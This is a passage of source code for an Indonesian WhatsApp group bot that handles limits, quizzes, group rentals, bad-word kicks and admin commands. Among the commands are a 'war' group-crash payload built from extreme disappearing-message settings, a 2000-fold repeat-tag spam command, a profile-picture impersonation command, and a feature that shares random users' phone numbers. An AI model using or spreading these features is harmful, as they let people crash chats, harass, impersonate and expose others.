	if (isOwner) {return false;}
	let position = false
    Object.keys(_limit).forEach((i) => {
	   if (_limit[i].id == sender) {
		   position = i
	   }
   })
   if (position !== false) {
	   _limit[position].limit += 2
	   fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
   }
}

  //Sewa Grup FUNCTION
const expireSewa = (_dir) => {
	setInterval(() => {
		let position = null
		Object.keys(_dir).forEach((i) => {
			if (Date.now() >= _dir[i].expired) {
				position = i
			}
		})
		if (position !== null) {
			var sewwa = `${_dir[position].id}`
			client.sendMessage(sewwa,`Maaf waktu sewa sudah habis. silakan hubungi owner jika ingin menyewa bot kembali !\nOwner: wa.me/${Laporowner}`, MessageType.text)
			sleep(8000)
			client.groupLeave(sewwa)
			client.sendMessage(`${Laporowner}@s.whatsapp.net`, `ID Group : ${sewwa}\nMasa sewa sudah habis`, MessageType.text)
			_dir.splice(position, 1)
			fs.writeFileSync('./lib/database/sewa.json', JSON.stringify(_dir))
		}
	}, 1000)
}   
expireSewa(sewa)

//=====================================================================================================//
            client.updatePresence(from, Presence.composing) //TYPING
			client.updatePresence(from, Presence.available) //BOT ALWAYS ONLINE
		 /********  MESS FUNCTION ********/
			mess = {
				wait: 'Sedang di proses...⏳',
				success: 'Sukses...!',
				limituser: `*「 LIMIT STATUS 」*

Hai kak ${pushname}
Kuota limit kamu sudah habis!
	
Untuk membeli limit silahkan ketik: ${prefix}buylimit`,
				error: {
					stick: 'Gagal, terjadi kesalahan saat mengkonversi gambar ke sticker!',
					Iv: 'Maaf link yang anda kirim tidak valid!!',
                    bug: `An internal error occurred. Please report via whatsapp wa.me/${Laporowner}`
				},
			only: {
				group: 'Maaf perintah ini hanya bisa digunakan didalam grup!',
				benned: 'Maaf nomer kamu telah terbanned. silahkan hubungi owner untuk membuka banned anda!',
				ownerG: 'Maaf perintah ini hanya bisa digunakan oleh owner grup!!',
				ownerB: 'Maaf perintah ini hanya bisa digunakan oleh owner bot! ',
				premium: `Maaf fitur ini khusus user premium!\n═════════════════\nIngin daftar? ketik: ${prefix}daftarpremium\n═════════════════`,
				userB: `*「 IvAn BOT 」*

Hai kak ${pushname}
Kamu belum terdaftar di database Bot!
Silahkan daftar terlebih dahulu.

Cara daftar ketik: #daftar nama|umur
Contoh: #daftar nabila|18`,
				admin: 'Maaf perintah ini hanya bisa digunakan oleh admin grup!',
				Badmin: 'Maaf perintah ini hanya bisa digunakan ketika bot menjadi admin!',
				publikG: `*[ GROUP MODE ]*\n\nMohon maaf bot sekarang hanya bisa digrup!\nInfo lebih lanjut ketik:\n${prefix}infobot`
				}
			}
			/***************** END MESS FUNCTION ********/

			//FUNCTION TICTACTOE
            idttt = []
	        players1 = []
	        players2 = []
	        gilir = []
	        for (let t of ky_ttt){
	        idttt.push(t.id)
	        players1.push(t.player1)
	        players2.push(t.player2)
	        gilir.push(t.gilir)
	        }
	        const isTTT = isGroup ? idttt.includes(from) : false
	        isPlayer1 = isGroup ? players1.includes(sender) : false
            isPlayer2 = isGroup ? players2.includes(sender) : false
//=================================================================================//
const ixbteam1 = ['1','2','3','4','5','6','7','8','9']
const ixbteam2 = ['1','2','3','4','5','6','7','8','9']
const ixbteam3 = ixbteam1[Math.floor(Math.random() * (ixbteam1.length))]
const ixbteam4 = ixbteam2[Math.floor(Math.random() * (ixbteam2.length))] 
const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍒 : 🍐',
        '?? : 🍋 : 🔔',//ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍒 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍐 : 🍇',
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        
const sotoyy= [
        'X : X : X',
        'X : O : X',
        'O : X : X',
        'O : O : X',
        'X : X : O',
        'O : O : O Win 👑',
        'O : X : O',
        'O : O : O Win👑'
        ]

  
			//FUNCTION CHAT
			const getGroup = async function(totalchat){
				let grup = []
				let a = []
				let b = []
				for (c of totalchat){
				   a.push(c.jid)
				}
				for (d of a){
				   if (d && d.includes('g.us')){
					  b.push(d)
				   }
				}
				for (e of b){
				   let ingfo = await client.groupMetadata(e)
				   grup.push(ingfo)
				}
				return grup
			 }                          
            
		//role level
        const levelRole = getLevelingLevel(sender)
        var role = 'Bronze I'
        if (levelRole <= 2) {
			role = 'Bronze II'
        } else if (levelRole >= 2) {
            role = 'Bronze III'
        } else if (levelRole >= 3) {
            role = 'Bronze IV'
        } else if (levelRole >= 4) {
            role = 'Bronze V'
        } else if (levelRole >= 5) {
            role = 'Silver I'
        } else if (levelRole >= 6) {
            role = 'Silver II'
        } else if (levelRole >= 7) {
            role = 'Silver III'
        } else if (levelRole >= 8) {
            role = 'Silver IV'
        } else if (levelRole >= 9) {
            role = 'Silver V'
        } else if (levelRole >= 10) {
            role = 'Gold I'
        } else if (levelRole >= 11) {
            role = 'Gold II'
        } else if (levelRole >= 12) {
            role = 'Gold III'
        } else if (levelRole >= 13) {
            role = 'Gold IV'
        } else if (levelRole >= 14) {
            role = 'Gold V'
        } else if (levelRole >= 15) {
            role = 'Platinum I'
        } else if (levelRole >= 16) {
            role = 'Platinum II'
        } else if (levelRole >= 17) {
            role = 'Platinum III'
        } else if (levelRole >= 18) {
            role = 'Platinum IV'
        } else if (levelRole >= 19) {
            role = 'Platinum V'
        } else if (levelRole >= 20) {
            role = 'Diamond'
        }
	
	        //function leveling
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 100
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                    await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
          //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return client.sendMessage(from,`Limit anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            client.sendMessage(from, ind.limitcount(limitCounts, pushname), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
                        client.sendMessage(from, ind.limitcount(limitCounts, pushname), text, { quoted : mek})
                    }
				}
				
			//funtion limited
           const isLimit = (sender) =>{ 
			if (isPremium) {return false;}
			if (isOwner) {return false;}
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
            //        client.sendMessage(from, mess.limituser, text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit))
           return false
       }
     }
	
        
            if (isGroup) {
				try {
					const getmemex = groupMembers.length
					    if (getmemex <= memberlimit) {
							client.sendMessage(from, `Maaf ${namabot} Tidak Bisa Masuk Group Karna Member Group ${groupMetadata.subject} Tidak Memenuhi Limit Member\nMinimal Member ${memberlimit}`, text)
                            client.groupLeave(from)
					    }
		       } catch (err) { console.error(err)  }
        }
	/*	if (isGroup) {
			client.sendMessage(from,`Owner sange kak`, text)
		}*/
      
            //function balance
            if (isRegistered ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }

		for (let anji of setiker){
			if (budy === anji){
				result = fs.readFileSync(`./sticker/${anji}.webp`)
				client.sendMessage(from, result, sticker, {quoted: mek})
				}
			}
	    for (let anjay of audionye){
            if (budy === anjay){
				result = fs.readFileSync(`./audio/${anjay}.mp3`)
			client.sendMessage(from, result, audio, {quoted: mek, ptt: true})
			}



		}
		 // Automate Check Premium
		 _premium.expiredCheck(prem)
	/*********************[ AFK ]****************/
		if (isGroup) {
			pesanafk = `@tag`
			orangnya = `${sender.split("@")[0]}`
			namagrupnya = `${groupName}`
			teksafk = `Karena anda sedang offline, teman anda mengirimkan pesan.\nPesan : ${pesanafk}\nNomor : ${orangnya}\nGroup : ${namagrupnya}`
			for (let x of mentionUser) {
				if (_afk.checkAfkUser(x, afk)) {
				const getId = _afk.getAfkId(x, afk)
				const getReason = _afk.getAfkReason(getId, afk)
				const getTime = _afk.getAfkTime(getId, afk)
				const cptl = `Maaf user yang anda reply atau tag sedang offline!
Alasan : ${getReason}
Sejak : ${getTime}`
		  mentions(cptl, x, true)
		  client.sendMessage(x, teksafk, text,{quoted: mek})
		}}
			if (_afk.checkAfkUser(sender, afk) && !isCmd) {
				const pep = `Anda telah keluar dari mode afk`
				reply(pep)
				afk.splice(_afk.getAfkPosition(sender, afk), 1)
				fs.writeFileSync('./database/json/afk.json', JSON.stringify(afk))
			}
			}
/*********************[ END AFK ]****************/

var kuis = false
//SAMBUNG KATA
if (sambungkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban = sambungkata[sender.split('@')[0]]
	userAnswer = budy.toLowerCase()
	if (userAnswer.startsWith(jawaban[jawaban.length - 1])) {
		get_result = await fetchJson(`http://api.lolhuman.xyz/api/sambungkata?apikey=${LolApi}&text=${userAnswer}`)
		await client.sendMessage(from, get_result.result, text, { quoted: mek }).then(() => {
			sambungkata[sender.split('@')[0]] = get_result.result.toLowerCase()
			fs.writeFileSync("./database/json/sambungkata.json", JSON.stringify(sambungkata))
		})
	} else {
		reply("Silahkan jawab dengan kata yang dimulai huruf " + jawaban[jawaban.length - 1])
	}
}
 // Tebak Gambar
 if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban = tebakgambar[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete tebakgambar[sender.split('@')[0]]
		fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Tebak Kimia
if (tebakkimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban8 = tebakkimia[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban8) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete tebakkimia[sender.split('@')[0]]
		fs.writeFileSync("./database/json/tebakkimia.json", JSON.stringify(tebakkimia))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Tebak Jenaka
if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban7 = tebakjenaka[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban7) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete tebakjenaka[sender.split('@')[0]]
		fs.writeFileSync("./database/json/tebakjenaka.json", JSON.stringify(tebakjenaka))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Tebak Lirik
if (tebakkimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban9 = tebaklirik[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban9) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete tebaklirik[sender.split('@')[0]]
		fs.writeFileSync("./database/json/tebaklirik.json", JSON.stringify(tebaklirik))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Tebak kata
if (tebakkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban2 = tebakkata[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban2) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete tebakkata[sender.split('@')[0]]
		fs.writeFileSync("./database/json/tebakkata.json", JSON.stringify(tebakkata))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Tebak bendera
if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban5 = tebakbendera[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban5) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete tebakbendera[sender.split('@')[0]]
		fs.writeFileSync("./database/json/tebakbendera.json", JSON.stringify(tebakbendera))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Asah Otak
if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban4 = asahotak[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban4) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete asahotak[sender.split('@')[0]]
		fs.writeFileSync("./database/json/asahotak.json", JSON.stringify(asahotak))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Susun kata
if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban3 = susunkata[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban3) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete susunkata[sender.split('@')[0]]
		fs.writeFileSync("./database/json/susunkata.json", JSON.stringify(susunkata))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}
// Siapakah aku
if (siapakahaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
	jawaban6 = siapakahaku[sender.split('@')[0]]
	if (budy.toLowerCase() == jawaban6) {
		reply("Jawaban anda benar!\nAtm +1000")
		addKoinUser(sender, 1000)
		delete siapakahaku[sender.split('@')[0]]
		fs.writeFileSync("./database/json/siapakahaku.json", JSON.stringify(siapakahaku))
	} else {
		reply("Jawaban anda salah!\nLimit -2")
		limitAddGame(sender)
	}
}

// MUTE
    if (isMuted){
	if (!isGroupAdmins && !isOwner) return
	if (body.toLowerCase().startsWith(prefix+'unmute')){
		let anu = mute.indexOf(from)
		mute.splice(anu, 1)
		fs.writeFileSync('./database/kelompok/mute.json', JSON.stringify(mute))
		reply(`Bot telah diunmute di group ini`)
	}
}

// BADWORD COK
        if (bad.includes(budy)) {
		if (!isBadWord) return
		if (!isGroup) return
		if (isOwner) return reply(`${pushname} adalah owner bot, bot tidak akan kick kamu`)
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
	    client.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 ANTI BADWORD 」*\nKamu dikick karena berkata kasar!`)
		setTimeout( () => {
		client.groupRemove(from, [Kick]).catch((e) => {reply(`ERROR: ${e}`)}) 
		}, 1000)
		setTimeout( () => {
		reply(`byee👋`)
		}, 0)
		}
		 

            //kolor
			colors = ['red','white','black','blue','yellow','green']
			
			//detector media
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

			//console log
			if (!isGroup && isCmd) console.log('[\x1b[1;32mCMD\x1b[1;37m]', color(time, 'yellow'), color(command), color(`[${args.length}]`), 'from', color(pushname))
			if (isCmd && isGroup) console.log('[\x1b[1;32mCMD\x1b[1;37m]', color(time, 'yellow'), color(command), color(`[${args.length}]`), 'from', color(pushname), 'in', color(groupName))	
			switch(command) {	
												
        case 'd':
        case 'del':
        case 'delete':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isGroupAdmins) return reply(mess.only.admin) 
                    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot!')
                    client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
                    break
case 'war':


                   if (!isOwner) return reply(mess.only.ownerB)
				if (!mek.key.fromMe && !isOwner)			 return reply('*itu commands bug gc tod khusus owner*')

			const xOnn2 = mek.prepareMessageFromContent(from, mek.prepareDisappearingMessageSettingContent(9999999999), {})
			const xOfff2 = mek.prepareMessageFromContent(from, mek.prepareDisappearingMessageSettingContent(0), {})
			await mek.relayWAMessage(xOnn2, { waitForAck: true })
			await mek.relayWAMessage(xOfff2, { waitForAck: true })
			break
        case 'od':
        case 'odel':
        case 'odelete':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isOwner) return reply(mess.only.ownerB)
                    client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
                    break						
		case 'mutual':
                    if (!isRegistered) return reply(mess.only.userB)
			    	if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				    hem = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                    await reply('Sedang mencari seseorang...')
                    try {
                    ppimg = await client.getProfilePicture(`${hem.split('@')[0]}@c.us`)
                    } catch {
                    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    teks = `‣ *Nama :* ${pushname}
‣ *Nomor :* ${hem.split("@")[0]}
‣ *Mutual :* wa.me/${hem.split("@")[0]}?text=halo

Klik link mutual untuk memulai obrolan`
                    its = await getBuffer (ppimg)
                    client.sendMessage(from, its, image, {
                    quoted: mek, caption: teks})
			    	await reply( `Partner found: 🙉\n${prefix}next — find a new partner`)
				    await limitAdd(sender)
				    break
		case 'next':
				    if (!isRegistered) return reply(mess.only.userB)
				    if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				    hem = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				    await reply('Sedang mencari seseorang...')
				    try {
				    ppimg = await client.getProfilePicture(`${hem.split('@')[0]}@c.us`)
					} catch {
				    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
                    teks = `‣ *Nama :* ${pushname}
‣ *Nomor :* ${hem.split("@")[0]}
‣ *Mutual :* wa.me/${hem.split("@")[0]}?text=halo
				   
Klik link mutual untuk memulai obrolan`
					its = await getBuffer (ppimg)
					client.sendMessage(from, its, image, {
				    quoted: mek, caption: teks})
				    await reply( `Partner found: 🙉\n${prefix}next — find a new partner`)
				    await limitAdd(sender)
				    break
		   
		case 'transfer':			
                    if (!isRegistered) return reply(mess.only.userB)
				    if (!q.includes('|')) return  reply(`Format salah! kirim ${prefix + command} @tag|jumalh`)
                	const tujuan = q.substring(0, q.indexOf('|') - 1)
                	const jumblah = q.substring(q.lastIndexOf('|') + 1)
                	if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                	if (jumblah < 5000 ) return reply(`minimal transfer 5000`)
                	if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                	const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                	fee = 0.010 *  jumblah
                	hasiltf = jumblah - fee
                	addKoinUser(tujuantf, hasiltf)
                	confirmATM(sender, jumblah)
                	addKoinUser(`${Laporowner}@s.whatsapp.net`, fee)
                	reply(`*「 SUKSES 」*\n\nPengiriman uang telah sukses\nDari : ${sender.split("@")[0]}\nKe : ${tujuan}\nJumlah transfer : ${jumblah}\nPajak : ${fee}`)
					break

					//=== DATABASE SEWA ===//
				case 'addsewa':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					const wakse = body.slice(9)
					_sewa.addSewa(from, wakse, sewa)
					swa = 'https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg'
					sewanjay = await getBuffer(swa)
					captsewa = `     *「 SEWA BOT 」*
		 
🕛 EXPIRED :
${ms(toMs(wakse)).days} Hari, ${ms(toMs(wakse)).hours} Jam, ${ms(toMs(wakse)).minutes} Menit, ${ms(toMs(wakse)).seconds} detik
		 
Ketik ${prefix}ceksewa		 
Untuk mengecek status sewa grup kamu!
		 
BOT OTOMATIS OUT JIKA DURASI HABIS`
                    client.sendMessage(from, sewanjay, image, {quoted: mek, caption: captsewa})
					break
				case 'ceksewa':
					if (!isGroup) return reply(mess.only.group)
					const cekExp1 = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
					swa = 'https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg'
					sewanjay = await getBuffer(swa)
				    captsewa = `*「 SEWA EXPIRE 」*
		 
📌 *ID:* ${from}
		 
🕛 *SEWA EXPIRED:*
${cekExp1.days}Hari, ${cekExp1.hours}Jam, ${cekExp1.minutes}Menit, ${cekExp1.seconds}detik`
                    client.sendMessage(from, sewanjay, image, {quoted: mek, caption: captsewa})
					break
			case 'delsewa':
					if (!isOwner) return reply(mess.only.ownerB)
					sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
					fs.writeFileSync('./lib/database/sewa.json', JSON.stringify(sewa))
					reply('Sukses menghapus sewa')
					break
			case 'sewalist': 
			case 'listsewa':
					let txtnyee = `*LIST SEWA GROUP ${namabot}*\nJumlah : ${sewa.length}\n\n`
					for (let i of sewa){
					let cekvipp = ms(i.expired - Date.now())
					txtnyee += `═════════════════\n*ID :* ${i.id} \n*Expire :* ${cekvipp.days}Hari, ${cekvipp.hours}Jam, ${cekvipp.minutes}Menit, ${cekvipp.seconds}Detik\n`
			        }
					txtnyee += `═════════════════`
					reply(txtnyee)
					break
			case 'addsewa2':            
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addsewa nama grup|tanggal sewa\ncontoh ${prefix}addsewa ixb group|04 April 2xxx `)
                    const pc = body.slice(9)
                    databasesewa.push(pc)
                    fs.writeFileSync('./database/kelompok/sewa.json', JSON.stringify(databasesewa))
                    reply('Success menambahkan ke database sewa')
                    break
            case 'delsewa2':
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}delsewa nama grup|tanggal sewa\ncontoh ${prefix}delsewa ixb group|04 April 2xxx `)
					const jarene =  body.slice(9)
			        var okembuh = databasesewa
			        for( var cq = 0; cq < okembuh.length; cq++){ 
			        if ( okembuh[cq] === jarene) { 
					okembuh.splice(cq, 1); 
					cq--; 
                    fs.writeFileSync('./database/kelompok/sewa.json', JSON.stringify(okembuh))
                    reply(`Success menghapus sewa group ${jarene}`)
				    }
			        }
                    break 
            case 'listsewa2':
                    let lbc = `*DATABASE SEWA ${namabot}*\nTotal : ${sewa.length}\n\n`
                    for (let i of databasesewa) {
                        lbc += `═════════════════\n➸ ${i.replace(databasesewa)}\n`
                    }
					lbc += `═════════════════\n\n`
					lbc += `Untuk mengetahui kapan waktu sewa habis. Silahkan +30 hari sejak tanggal awal sewa yg tertera di database.`
                    await reply(lbc)
                    break 

					//=== END DATABASE SEWA ===//
            case 'addbadword':    
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/kelompok/bad.json', JSON.stringify(bad))
                    reply(`Success menambahkan badword! ${body.slice(12)}`)
                    break
            case 'delbadword':
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}delbadword bego`)
			        const okew = body.slice(12)
			        var okeww = bad
			        for( var cd = 0; cd < okeww.length; cd++){ 
			        if ( okeww[cd] === okew) { 
					okeww.splice(cd, 1); 
					cd--; 
					fs.writeFileSync('./database/kelompok/bad.json', JSON.stringify(okeww))
			        }
			        }
                    reply(`Success menghapus badword ${body.slice(12)}`)
                    break 
            case 'listbadword':
                    let lbw = `This is list of badword\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break 
		
            case 'nobadword':
			case 'antibadword':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin) 
                if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
                if (args[0] === '1') {
                if (isBadWord) return reply('Fitur BadWord sudah aktif sebelum nya')
                badword.push(from)
                fs.writeFileSync('./database/kelompok/badword.json', JSON.stringify(badword))
                reply(`*「 ANTI BADWORD 」*\nPerhatian untuk member grup tercinta\nHarap jangan toxic di sini atau ${namabot} akan kick!`)
              	} else if (args[0] === '0') {
                badword.splice(from, 1)
                fs.writeFileSync('./database/kelompok/badword.json', JSON.stringify(badword))
                reply(`Sukses menonaktifkan anti badword!`)
                } else {
                reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
                }
                break
case 'getpic':
		if (!isOwner) return reply(mess.only.ownerB)
		if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
        linkpp = await client.getProfilePicture(from) || "https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg"
        buffer = await getBuffer(linkpp)
        client.sendMessage(from, buffer, image, {caption: "Nih", quoted: mek })
        } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
        mberr = mek.message.extendedTextMessage.contextInfo.participant
        linkpp = await client.getProfilePicture(mberr) || "https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg"
        buffer = await getBuffer(linkpp)
        client.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
        } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
        mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        linkpp = await client.getProfilePicture(mberr) || "https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg"
        buffer = await getBuffer(linkpp)
        client.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
        }
	    break
case 'getpp':
        if (!isGroupAdmins) return reply(mess.only.admin)
        if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
        linkpp = await client.getProfilePicture(from) || "https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg"
        buffer = await getBuffer(linkpp)
        client.sendMessage(from, buffer, image, {caption: "Nih", quoted: mek })
        } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
        mberr = mek.message.extendedTextMessage.contextInfo.participant
        linkpp = await client.getProfilePicture(mberr) || "https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg"
        buffer = await getBuffer(linkpp)
        client.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
        } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
        mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        linkpp = await client.getProfilePicture(mberr) || "https://i.ibb.co/cbm6zZZ/589d9506b3b5.jpg"
        buffer = await getBuffer(linkpp)
        client.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
        }
        break
case 'clone':
	    if (!isOwner) return reply(mess.only.ownerB)
     	if (!isGroup) return reply(mess.only.group)
    	if (args.length < 1) return reply('Tag target yang ingin di clone')
    	if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag gan')
      	mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		pp = await client.getProfilePicture(mentioned)
		buffer = await getBuffer(pp)
		client.updateProfilePicture(botNumber, buffer)
		reply('Makasih profil barunya😘')
    	break
case 'rptag':
        if (!isOwner) return reply(mess.only.ownerB)
        if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply("Gada yang di tag")
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
        teks = `*Repeat Tag*\n${q}`
        teks += "\n\n"
        members_id = []
        for (let z = 0; z < 2000; z++) {
        teks += ` @${mentioned[0].split("@")[0]}`
        members_id.push(mentioned[0])
        }
        mentions(teks, members_id, true)
        break
case 'repeattag':
		if (!isGroupAdmins) return reply(mess.only.admin)
